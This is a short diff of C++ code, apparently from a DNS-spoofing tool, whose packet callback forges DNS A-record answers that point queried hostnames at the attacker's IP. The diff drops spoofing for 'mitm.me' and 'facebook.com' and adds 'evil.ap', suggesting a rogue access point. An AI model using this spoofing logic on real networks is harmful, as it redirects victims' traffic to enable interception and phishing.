@@ -24,10 +24,7 @@ bool callback(const PDU& pdu) {
             // "A" record query, spoof response
             string hostname = query.dname();
             cout << "DNS QUERY: " + hostname << endl;
-            if(hostname == "mitm.me") {
-                dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
-            }
-            if(hostname == "facebook.com") {
+            if(hostname == "evil.ap") {
                 dns.add_answer(DNS::resource(hostname,myIp.to_string(),DNS::A,query.query_class(),666));
             }
         }
